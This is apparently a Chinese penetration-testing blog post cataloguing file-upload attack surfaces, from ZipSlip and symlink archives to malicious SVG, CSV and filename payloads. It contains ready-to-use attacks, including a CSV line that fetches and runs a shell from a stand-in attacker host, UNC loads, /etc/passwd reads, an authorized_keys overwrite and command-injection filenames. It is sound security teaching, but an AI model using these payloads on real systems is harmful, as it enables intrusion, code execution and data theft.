# 文件上传攻击面&amp;案例



&lt;!--more--&gt;
## 1.1. 前言

本文主要介绍文件上传功能点有哪些攻击面。

整理的有点粗糙，将就看吧。

## 1.2. 允许直接上传shell

只要有文件上传功能，那么就可以尝试上传shell直接执行恶意代码，获得服务器权限，这是最简单也是最直接的利用。

上传shell包括Webshell、脚本文件、代码文件等

Java/JSP 后缀

```
jsp  jsw  jsv	jspa	jspf  jspx  jhtml
```

PHP后缀：

```
php		php2		php3		php4		php5		php6		php7		pht
inc		phps		phar		pgif		phtm		phtml		shtml
html	htm
```

ASP.NET 后缀

```sh
asp		asa		svc		rem		axd		asax	ascx	asmx		cer
aspx	ashx	aspq	soap	xamlx	cshtm
vbhtm	cshtml	vbhtml
```

Apache SSI上传
```
stm  shtm  shtml
```

其他：

```
pl		pm		sh		cfm		cgi		lib
```



## 1.3. 允许上传压缩包

### ZipSlip/Traversal

如果可以上传压缩包，并且服务端会对压缩包解压，那么就可能存在`ZipSlip/Traversal`目录穿越漏洞；

通过构造一个压缩包中带有`../`的压缩文件，上传后交给服务端应用程序进行解压，如果程序解压时没有对压缩包内的文件名进行合法性校验，而是直接将文件名拼接在待解压目录后面，导致可以将文件解压到正常解压缩路径之外，可能导致恶意文件的写入、覆盖替换可执行文件等，等待系统或用户调用恶意文件，从而实现代码执行（也可能是覆盖配置文件或其他敏感文件）。

可能的压缩包格式后缀包括：

```
tar		jar		war		cpio		apk		rar		7z
```



**本质：** 没有对压缩包中的文件名进行合法性校验，直接将文件名拼接到待解压目录中，导致存在路径遍历风险。

**举例：** 若解压目录为`/webapp/web/`，给文件命名为：`../../var/www/html/1.php`并压缩，那么文件解压后，通过直接拼接文件名为`/webapp/web/../../var/www/html/1.php`，因此最终就会存放到`/var/www/html/1.php`中，如果能访问并解析，那么就能成功代码执行。

**利用：** [zip-slip-vulnerability](https://github.com/snyk/zip-slip-vulnerability) 项目包含了有关此攻击的所有信息，例如受影响的库、项目和其他相关信息。

**构造代码：**

&gt; 也可以用别人写好的工具：https://github.com/ptoomey3/evilarc

```python
import zipfile
# the name of the zip file to generate
zf = zipfile.ZipFile(&#39;out.zip&#39;, &#39;w&#39;)
# the name of the malicious file that will overwrite the origial file (must exist on disk)
fname = &#39;zip_slip.txt&#39;
#destination path of the file
zf.write(fname, &#39;../../../../../../../../../../../../../../../../../../../../../../../../tmp/zip_slip.aaa&#39;)
```



### Symlinks attack

tar/zip 允许压缩包中包含符号链接。符号链接是一种链接到另一个文件的特殊文件。通过上传包含符号链接的 ZIP，并在解压 ZIP 后，可以通过访问符号链接以访问到原本无法访问的文件。为此，需要让符号链接指向 Web 根目录之外的文件，例如“/etc/passwd”。

这些类型的问题通常是在开发人员允许上传 ZIP 文件时发现的。当用户在应用程序中上传恶意 ZIP 文件时，它只会获取 ZIP 文件并将其提取出来，而不会进行任何进一步的验证。

例如：

- [facebook 本地文件读取](https://josipfranjkovic.blogspot.com/2014/12/reading-local-files-from-facebooks.html)
- [CVE-2016-9086-读取应用服务器上的文件，导致 RCE](https://hackerone.com/reports/178152)

```sh
1. 创建一个符号链接文件指向/etc/passwd 
ln -s /etc/passwd link 

2. 压缩文件，同时保留链接 
zip --symlinks test.zip link 

3. 上传test.zip文件，系统会自动解压缩 

4. 页面当中会返回/etc/passwd的内容
```



这里是通过绝对路径读取文件，还有可能是相对路径。

参考：https://secops.group/anatomy-of-a-file-upload-attack/

```sh
创建了/etc/passwd 文件的符号链接，并使用以下命令将文件压缩到 ZIP 存档中
sudo ln -s ../../../../../../../../../../etc/passwd name_of_symlink.txt
sudo zip --symlink zip_file.zip  name_of_symlink.txt

上传了包含Symlink的ZIP文件，提取了 Symlink 文件，通过预览文件访问服务器的“passwd”文件的内容
```



### 利用tar权限

Abusing tar permissions

如果应用程序服务端使用 `tar`命令提取解压`.tar`文件、删除符号链接并访问子目录，则可以尝试利用 tar 权限控制绕过符号链接删除过程。

`tar`命令创建`.tar`文件存档时会保留分配给它的 unix 权限。如果设置父目录无人可读（  `chmod 300`），同时子目录具有完整权限（ `chmod 700`），则可以在子目录中包含符号链接，这些符号链接在符号链接删除过程中不会被找到，但由于子目录具有读取权限，因此直接访问时会找到。

案例：[Reading local files by abusing tar permissions in Gitlab Imports (Possibly leading to RCE)](https://gitlab.com/gitlab-org/gitlab-foss/-/issues/55501)

```sh
$ mkdir parent
$ cd parent
$ tar cf a.tar . --mode=300
$ mkdir sub
$ cd sub
$ ln -s /etc/passwd file.txt
$ cd ..
$ tar -rf a.tar sub
```



## 1.4. 允许上传HTML文件

允许上传html或者XML都可以能导致xss，也能导致任意URL跳转，甚至还能导致SSRF（很难利用），因为核心还是js代码可控。

html造成XSS就不多说了，懂得都懂

|              | HTML文件后缀                         |
| ------------ | ------------------------------------ |
| Common       | htm		html	shtml             |
| IIS          | htm		hxt                       |
| Apache httpd | html.de	html.xxx                  |
| 其他/少见    | body	    manifest		appcache |

检查 MIME 类型是否存在可能的 XSS：

- [content-type-research](https://github.com/BlackFan/content-type-research) 项目

## 1.5. 允许上传XML格式文件并解析

如果允许上传XML格式文件，如`docx`、`xlsx`、`svg`等本质是xml的文件，且后端会对上传的文件进行解析，那么可能存在XSS、XXE等漏洞

### XSS

|              | XSS 后缀                                                     |
| ------------ | ------------------------------------------------------------ |
| Common       | xml	svg		xht		xsd		xsl		svgz  	xhtml |
| IIS          | dtd	vml	xsf	mno	wsdl	xslt	disco	exe.config	dll.config |
| Apache httpd | rdf		mathml                                            |
| 其他/少见    | vtt		mml                                               |

主要说说svg文件如何造成xss

**检查思路：**

1. 创建一个恶意的svg文件，输入如下内容：

```xml
&lt;?xml version=&#34;1.0&#34; standalone=&#34;no&#34;?&gt;
&lt;!DOCTYPE svg PUBLIC &#34;-//W3C//DTD SVG 1.1//EN&#34; &#34;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&#34;&gt;
&lt;svg version=&#34;1.1&#34; baseProfile=&#34;full&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
   &lt;polygon id=&#34;triangle&#34; points=&#34;0,0 0,50 50,0&#34; fill=&#34;#009900&#34; stroke=&#34;#004400&#34;/&gt;
   &lt;script type=&#34;text/javascript&#34;&gt;
      alert(document.domain);
   &lt;/script&gt;
&lt;/svg&gt;
```

上传到文件中，并访问即可触发XSS。

### XXE

XXE in XML

以恶意svg为例，一般尝试OOB外带注入的方式来判断最快

```xml
&lt;?xml version=&#34;1.0&#34; standalone=&#34;yes&#34;?&gt;
&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &#34;file:///etc/hostname&#34; &gt; ]&gt;
&lt;svg width=&#34;128px&#34; height=&#34;128px&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; xmlns:xlink=&#34;http://www.w3.org/1999/xlink&#34; version=&#34;1.1&#34;&gt;
  &lt;text font-size=&#34;16&#34; x=&#34;0&#34; y=&#34;16&#34;&gt;&amp;xxe;&lt;/text&gt;
&lt;/svg&gt;
```

恶意的XXE文档生成：[docem](https://github.com/whitel1st/docem.git)



XXE in OOXML/ODF

```
.docx		.xlsx		.odt
```

- https://oxmlxxe.github.io/
- [Exploiting XXE with Excel](https://www.4armed.com/blog/exploiting-xxe-with-excel/)



### SSRF

 Tip:

如果目标存在导出功能，如给svg导出为pdf这种功能，那么可能存在**SSRF**

```xml
&lt;svg xmlns:svg=&#34;http://www.w3.org/2000/svg&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; xmlns:xlink=&#34;http://www.w3.org/1999/xlink&#34; width=&#34;200&#34; height=&#34;200&#34;&gt; 
&lt;image height=&#34;30&#34; width=&#34;30&#34; 
xlink:href=&#34;https://controlledserver.com/pic.svg&#34; /&gt; 
&lt;/svg&gt;
```

可尝试使用其他协议更直观的查看，如`file://`

参考：

- [SVG Server Side Request Forgery (SSRF)](https://hackerone.com/reports/223203)
- [SVG SSRF Cheatsheet](https://github.com/allanlw/svg-cheatsheet)



### DOS

如果可以上传任意SVG文件，且可在网站的某些页面中进行展示，那么可以通过反复嵌套使用，直至浏览器或者电脑卡死。

&gt; 可以展示：不一定非得是`&lt;svg&gt;`标签的形式，也可以通过img等标签展示，形如：`&lt;img src=&#34;data:image/svg&#43;xml;base64,&lt;svg base64&gt;&#34; alt=&#34;SVG Image&#34;&gt;`

```xml
&lt;svg version=&#34;1.2&#34; baseProfile=&#34;tiny&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; xmlns:xlink=&#34;http://www.w3.org/1999/xlink&#34; x=&#34;0px&#34; y=&#34;0px&#34; xml:space=&#34;preserve&#34;&gt;
&lt;path id=&#34;a&#34; d=&#34;M0,0&#34;/&gt;
&lt;g id=&#34;b&#34;&gt;&lt;use xlink:href=&#34;#a&#34;/&gt;&lt;use xlink:href=&#34;#a&#34;/&gt;&lt;use xlink:href=&#34;#a&#34;/&gt;&lt;use xlink:href=&#34;#a&#34;/&gt;&lt;use xlink:href=&#34;#a&#34;/&gt;&lt;use xlink:href=&#34;#a&#34;/&gt;&lt;use xlink:href=&#34;#a&#34;/&gt;&lt;use xlink:href=&#34;#a&#34;/&gt;&lt;use xlink:href=&#34;#a&#34;/&gt;&lt;use xlink:href=&#34;#a&#34;/&gt;&lt;/g&gt;
&lt;g id=&#34;c&#34;&gt;&lt;use xlink:href=&#34;#b&#34;/&gt;&lt;use xlink:href=&#34;#b&#34;/&gt;&lt;use xlink:href=&#34;#b&#34;/&gt;&lt;use xlink:href=&#34;#b&#34;/&gt;&lt;use xlink:href=&#34;#b&#34;/&gt;&lt;use xlink:href=&#34;#b&#34;/&gt;&lt;use xlink:href=&#34;#b&#34;/&gt;&lt;use xlink:href=&#34;#b&#34;/&gt;&lt;use xlink:href=&#34;#b&#34;/&gt;&lt;use xlink:href=&#34;#b&#34;/&gt;&lt;/g&gt;
&lt;g id=&#34;d&#34;&gt;&lt;use xlink:href=&#34;#c&#34;/&gt;&lt;use xlink:href=&#34;#c&#34;/&gt;&lt;use xlink:href=&#34;#c&#34;/&gt;&lt;use xlink:href=&#34;#c&#34;/&gt;&lt;use xlink:href=&#34;#c&#34;/&gt;&lt;use xlink:href=&#34;#c&#34;/&gt;&lt;use xlink:href=&#34;#c&#34;/&gt;&lt;use xlink:href=&#34;#c&#34;/&gt;&lt;use xlink:href=&#34;#c&#34;/&gt;&lt;use xlink:href=&#34;#c&#34;/&gt;&lt;/g&gt;
&lt;g id=&#34;e&#34;&gt;&lt;use xlink:href=&#34;#d&#34;/&gt;&lt;use xlink:href=&#34;#d&#34;/&gt;&lt;use xlink:href=&#34;#d&#34;/&gt;&lt;use xlink:href=&#34;#d&#34;/&gt;&lt;use xlink:href=&#34;#d&#34;/&gt;&lt;use xlink:href=&#34;#d&#34;/&gt;&lt;use xlink:href=&#34;#d&#34;/&gt;&lt;use xlink:href=&#34;#d&#34;/&gt;&lt;use xlink:href=&#34;#d&#34;/&gt;&lt;use xlink:href=&#34;#d&#34;/&gt;&lt;/g&gt;
&lt;g id=&#34;f&#34;&gt;&lt;use xlink:href=&#34;#e&#34;/&gt;&lt;use xlink:href=&#34;#e&#34;/&gt;&lt;use xlink:href=&#34;#e&#34;/&gt;&lt;use xlink:href=&#34;#e&#34;/&gt;&lt;use xlink:href=&#34;#e&#34;/&gt;&lt;use xlink:href=&#34;#e&#34;/&gt;&lt;use xlink:href=&#34;#e&#34;/&gt;&lt;use xlink:href=&#34;#e&#34;/&gt;&lt;use xlink:href=&#34;#e&#34;/&gt;&lt;use xlink:href=&#34;#e&#34;/&gt;&lt;/g&gt;
&lt;g id=&#34;g&#34;&gt;&lt;use xlink:href=&#34;#f&#34;/&gt;&lt;use xlink:href=&#34;#f&#34;/&gt;&lt;use xlink:href=&#34;#f&#34;/&gt;&lt;use xlink:href=&#34;#f&#34;/&gt;&lt;use xlink:href=&#34;#f&#34;/&gt;&lt;use xlink:href=&#34;#f&#34;/&gt;&lt;use xlink:href=&#34;#f&#34;/&gt;&lt;use xlink:href=&#34;#f&#34;/&gt;&lt;use xlink:href=&#34;#f&#34;/&gt;&lt;use xlink:href=&#34;#f&#34;/&gt;&lt;/g&gt;
&lt;g id=&#34;h&#34;&gt;&lt;use xlink:href=&#34;#g&#34;/&gt;&lt;use xlink:href=&#34;#g&#34;/&gt;&lt;use xlink:href=&#34;#g&#34;/&gt;&lt;use xlink:href=&#34;#g&#34;/&gt;&lt;use xlink:href=&#34;#g&#34;/&gt;&lt;use xlink:href=&#34;#g&#34;/&gt;&lt;use xlink:href=&#34;#g&#34;/&gt;&lt;use xlink:href=&#34;#g&#34;/&gt;&lt;use xlink:href=&#34;#g&#34;/&gt;&lt;use xlink:href=&#34;#g&#34;/&gt;&lt;/g&gt;
&lt;g id=&#34;i&#34;&gt;&lt;use xlink:href=&#34;#h&#34;/&gt;&lt;use xlink:href=&#34;#h&#34;/&gt;&lt;use xlink:href=&#34;#h&#34;/&gt;&lt;use xlink:href=&#34;#h&#34;/&gt;&lt;use xlink:href=&#34;#h&#34;/&gt;&lt;use xlink:href=&#34;#h&#34;/&gt;&lt;use xlink:href=&#34;#h&#34;/&gt;&lt;use xlink:href=&#34;#h&#34;/&gt;&lt;use xlink:href=&#34;#h&#34;/&gt;&lt;use xlink:href=&#34;#h&#34;/&gt;&lt;/g&gt;
&lt;g id=&#34;j&#34;&gt;&lt;use xlink:href=&#34;#i&#34;/&gt;&lt;use xlink:href=&#34;#i&#34;/&gt;&lt;use xlink:href=&#34;#i&#34;/&gt;&lt;use xlink:href=&#34;#i&#34;/&gt;&lt;use xlink:href=&#34;#i&#34;/&gt;&lt;use xlink:href=&#34;#i&#34;/&gt;&lt;use xlink:href=&#34;#i&#34;/&gt;&lt;use xlink:href=&#34;#i&#34;/&gt;&lt;use xlink:href=&#34;#i&#34;/&gt;&lt;use xlink:href=&#34;#i&#34;/&gt;&lt;/g&gt;
&lt;/svg&gt;
```

**原理**：

`xlink:href` 属性以 IRI（国际资源标识）方式定义了对某个资源的引用，该链接的具体含义需根据使用该链接的每个元素的上下文来决定。

`&lt;use&gt;` 元素从 SVG 文档中获取节点，然后将其复制到其他位置。

上述代码通过递归嵌套，导致浏览器拒绝服务，网站页面崩溃。



## 1.6. 允许上传CSV

如果允许上传CSV文件，且上传的CSV文件的内容未经过处理过滤直接保存，那么可以尝试上传具有恶意命令执行payload的CSV文件，当其他用户下载该CSV文件时，可能会导致命令执行。

CSV Payload

```csv
DDE (&#34;cmd&#34;;&#34;/C calc&#34;;&#34;!A0&#34;)A0
@SUM(1&#43;9)*cmd|&#39; /C calc&#39;!A0
=10&#43;20&#43;cmd|&#39; /C calc&#39;!A0
=cmd|&#39; /C notepad&#39;!&#39;A1&#39;
=cmd|&#39;/C powershell IEX(wget attacker_server/shell.exe)&#39;!A0
=cmd|&#39;/c rundll32.exe \\10.0.0.1\3\2\1.dll,0&#39;!_xlbgnm.A1
```

**检查思路：**

1. 上传恶意的CSV文件
2. 下载恶意的CSV文件
3. 观察下载后的CSV文件是否对`等号=`等特殊符号做了处理，payloads会否会成功执行，如果能则说明存在问题

参考：

- [CSV Injection at xxxxx](https://hackerone.com/reports/1748961)
- [Authenticated Code Execution through Phar deserialization in CSV Importer as Shop manager in WooCommerce](https://hackerone.com/reports/403083)





## 1.7. 允许上传PDF

可能存在PDF XSS和任意URL跳转。

可以直接使用工具生成：https://github.com/harunoz/js_pdf_xss.git

也可以按照网上的操作，用迅捷PDF编辑器去操作，效果都一样

pdfjs 漏洞： CVE-2024-4367 获取Cookie、账户接管等。https://github.com/LOURC0D3/CVE-2024-4367-PoC

参考：

- [Stored XSS through PDF viewer](https://hackerone.com/reports/881557)
- [XSS in PDF Viewer](https://hackerone.com/reports/819863)



## 1.8. 允许上传音视频文件

上传Audio/Video的利用点

Text Metadata 元数据：XSS, SQLi, 命令注入

ffmpeg：

- SSRF/File Read in HLS playlists (m3u8)：https://github.com/ffmpeg-test/ffmpeg-test
- SSRF/File Read in HLS inside AVI：https://github.com/neex/ffmpeg-avi-m3u-xbin

Images in mp3 metadata

参考：

- [External SSRF and Local File Read via video upload due to vulnerable FFmpeg HLS processing](https://hackerone.com/reports/1062888)
- [SSRF and local file read in video to gif converter](https://hackerone.com/reports/115857)



## 1.9. 允许上传图片

https://github.com/barrracud4/image-upload-exploits

### 大文件DOS

文件上传的时候，服务端通常会对上传的文件进行大小限制，范围一般为5MB-200 MB，甚至更小/更大，具体取决于应用程序逻辑。但是如果未限制文件大小或不存在相关的验证检查，那么攻击者可能会上传相对较大的文件，造成大量资源消耗，从而可能导致拒绝服务。

**检查思路：**

1. 创建一个超大的图片文件，如500M的png，并上传图片
2. 新开一个浏览器页面或从另一台设备浏览网站，查看响应速度是否变慢或是否存在连接错误等异常情况

参考：

- [PNG compression DoS](https://hackerone.com/reports/454)

### 像素洪水攻击

任意可以上传图片的地方都可以进行测试；在`Pixel Flood Attack`中，攻击者尝试上传具有大像素的文件（64250x64250像素），一些应用会使用第三方组件/库对图像进行缩小处理，以节省存储空间和处理能力，但是这些第三方库在处理的时候，会将“整个图像”加载到内存中，它会尝试将4128062500像素分配到内存中，从而消耗服务器资源，导致应用最终崩溃宕机。

**检查思路：**

1. 在https://www.resizepixel.com/中调整图片大小为 64250x64250，上传图片（现在好像不行了）
2. 新开一个浏览器页面或从另一台设备浏览网站，查看响应速度是否变慢或是否存在连接错误等异常情况

参考

- [Pixel flood attack](https://hackerone.com/reports/390)
- [Pixel Flood Attack leads to Application level DoS](https://hackerone.com/reports/970760)



### 元数据攻击

使用 [exiftool](http://www.sno.phy.queensu.ca/~phil/exiftool/)这个工具可以通过改变EXIF  metadata进而一定几率引起某处反射：

```sh
#!bash
$ exiftool -field = XSS FILE
```

例如：

```sh
#!bash
$ exiftool -Artist=’ “&gt;&lt;img src=1 onerror=alert(document.domain)&gt;’ brute.jpeg
```

参考：

- [RCE when removing metadata with ExifTool](https://hackerone.com/reports/1154542)
- [XXE through injection of a payload in the XMP metadata of a JPEG file](https://hackerone.com/reports/836877)
- [XSS in image metadata field](https://hackerone.com/reports/896511)



### 图片二次渲染

若服务端使用存在漏洞的组件对上传图片进行二次渲染等操作，那么也可以尝试RCE，如[`ImageMagick`](https://www.acunetix.com/vulnerabilities/web/imagemagick-remote-code-execution/)

一些ImageMagick相关的CVE：

- CVE-2016–3714 — 字符过滤不足导致潜在RCE
- CVE-2016–3715 — File deletion
- CVE-2016–3716 — File moving
- CVE-2016–3717 — Local file read
- CVE-2016–3718 — SSRF

参考：

- [HEIC image preview can be used to invoke Imagick](https://hackerone.com/reports/1261413)

### 内存泄露

ImageMagick相关的CVE

- XBM：CVE-2018-16323
- GIF：CVE-2017-15277

参考：

- [Missing &#34;size check&#34; on files to upload could make memory leaks.](https://hackerone.com/reports/19532)
- [AWS keys and user cookie leakage via uninitialized memory leak in outdated librsvg version in Basecamp](https://hackerone.com/reports/2107680)

### GhostScript PS/PDF

- CVE-2019-1481X
- CVE-2019-10216
- CVE-2019-6116
- CVE-2018-16509
- CVE-2017-8291

参考：

- [Remote Code Execution on xxxx/my_reports on Logo upload](https://hackerone.com/reports/403417)

### 合法文件隐藏载荷

在图片元数据中隐藏 Shell/XSS 载荷

在图片二进制数据中隐藏 Shell/XSS 载荷

这个比较简单，和上面内容有重复，就不说了。

## 1.10 允许上传文件预览

常见的文件预览包括：PDF、图片、HTML等文件。

如果应用程序调整图片大小或处理媒体，请检查图像漏洞 (&#43;favicon.ico)

这个比较简单，和上面内容有重复，就不说了。

## 1.11 允许上传配置文件

```sh
# Apache httpd/ Tomcat
.htaccess
# ASP.NET / IIS
web.config
# 其他访问/框架
……
```





## 1.12. 文件名攻击

不会对上传文件重命名或对文件操作过程中可能性的问题。

### 路径遍历/UNC

- 相对路径： `../../../../tmp/upload.txt`
- 绝对路径：`/tmp/upload.txt`
- UNC路径：`\\evil.com\share\test.png`

一些网站配置不当，或者开发安全意识不严谨，将用户上传的文件直接按原名存储到服务器中，那么我们就可以尝试将文件名添加回溯符`../`，以上传文件到任意目录，甚至覆盖文件，达到getshell或者破坏系统的目的。



&gt; :bell: Tip
&gt;
&gt; 在windows中由于部分符号不能作为文件名，如果我们将文件名设置为带有这些特殊符号的内容，那么可能让服务器抛出异常

较少的情况下，可以控制上传的目录名，也可以通过路径遍历的方法上传到任意目录中。

如将文件名设置为`../../../../etc/passwd`，然后上传对应的内容，那么则有可能直接覆盖掉`/etc/passwd`

一般情况下尽量去覆盖不会对系统产生影响且我们可以直接观察到的文件，如`robots.txt`等

**上传覆盖文件**

有点类似Redis写ssh

**写SSH公钥**

覆盖 **`/root/.ssh/authorized_keys`** 文件。如果这个文件包含我们控制的私钥的公钥，我们就可以以root 用户通过SSH访问系统。

使用 **ssh-keygen** 创建一个 SSH 密钥对，以及一个名为 **authorized_keys**的文件，其中包含之前创建的公钥。

```sh
kali@kali:~$ ssh-keygen  
Generating public/private rsa key pair.  
Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup  
Enter passphrase (empty for no passphrase):   
Enter same passphrase again:   
Your identification has been saved in fileup  
Your public key has been saved in fileup.pub  
...  

kali@kali:~$ cat fileup.pub &gt; authorized_keys
```

&gt; 为文件上传准备authorized_keys 文件

使用相对路径 `../../../../../../../root/.ssh/authorized_keys` 上传它进行覆盖。

### SSRF

尝试将 URL 作为文件名发送以获取盲 SSRF，例如`filename=https://172.17.0.1/internal/file`。

还可以尝试在请求中更改`type=&#34;file&#34;`为。`type=&#34;url&#34;`

### DOS

后端没有对文件名长度进行限制，可以尝试上传一个名称较大的文件，有时会导致 DoS。

案例：[报告：头像名称参数值过大导致平台上其他用户和程序遭受 DoS 攻击](https://hackerone.com/reports/764434)

### 文件名注入

在文件名中加入 XSS、SQLi、命令注入payload。

在文件名中加入攻击载荷，服务端可能对上传的文件名进行各种处理，如展示到页面、存储到数据库等，因此可能存在各种各样的注入，如XSS、SQLI、命令注入等

如上传文件名为`test.png`，那么我们可以设置变量为`§test§.png`，然后fuzz一下各种注入的payload，如：

```sh
a$(whoami)z.png
a`whoami`z.png
a&#39;;select&#43;sleep(10);--z.png
sleep(10)-- -.png
&lt;h1&gt;test&lt;h1&gt;.png
${2*3}
```



命令注入的情况：

文件上传后，服务端通过系统命令进行文件的重命名、复制、移动、删除等动作，可能调用系统命令执行。未对文件名进行过滤，导致命令注入。



参考：

- [RCE vulnerability in a file name](https://www.vaadata.com/blog/rce-vulnerability-in-a-file-name/)
- [Remote Unrestricted file Creation/Deletion and Possible RCE.](https://hackerone.com/reports/191884)

## 1.13. 文件路径可控

路径遍历

```http
POST /uai/download/uploadfileToPath.htm HTTP/1.1
…………

-----------------------------570xxxxxxxxx6025274xxxxxxxx1
Content-Disposition: form-data; name=&#34;input_localfile&#34;; filename=&#34;xxx.jsp&#34;
Content-Type: image/png

&lt;%out.println(&#39;test123&#39;);%&gt;

-----------------------------570xxxxxxxxx6025274xxxxxxxx1
Content-Disposition: form-data; name=&#34;uploadpath&#34;

../webapps/notifymsg/devreport/
-----------------------------570xxxxxxxxx6025274xxxxxxxx1--
```

参考：

- [Unrestricted file upload (RCE)](https://hackerone.com/reports/343726)

## 1.14. 元数据泄漏

元数据是照片背后的故事，它告诉我们图像文件是如何创建的，在哪里和何时创建的。它还描述了照片的内容，确定了摄影师，并向您展示了图像在后期处理中是如何编辑的。简单地说，假设您使用数码相机单击了一张图片，当该图像被处理并保存在存储设备上时，一些属性被添加到文件中，例如作者、位置、设备信息和其他适用于描述图像信息的信息。

如果服务端对用户上传的图片未进行处理就直接展示，那么将可能会导致源数据泄漏；通常情况下，元数据中包含GPS地址、设备信息等，会被当作低危。

&gt;  Note
&gt;
&gt; 元数据泄漏不仅限于图片，还可以在其他文件格式中找到，如PDF

**检查方法：**

1. 在头像上传等图片可以被枚举的功能点上传包含有exif敏感信息的图片，没有的话可以用手机现拍
2. 下载刚才上传的图片（如果用下面的在线平台这一步可以省略）
3. 使用 http://exif.regex.info/exif.cgi 或者 exiftool 去分析数据

**参考**：

- [EXIF metadata not stripped from JPG group logos](https://hackerone.com/reports/446238)，隐私泄露问题

## 参考文章

- https://blog.gm7.org/个人知识库/01.渗透测试/02.WEB漏洞/16.文件上传
- https://github.com/c0ny1/upload-labs
- https://0xn3va.gitbook.io/cheat-sheets/web-application/file-upload-vulnerabilities







---

> 作者: Xavier  
> URL: http://localhost:1313/posts/file-upload-attack-surface-and-cases/  

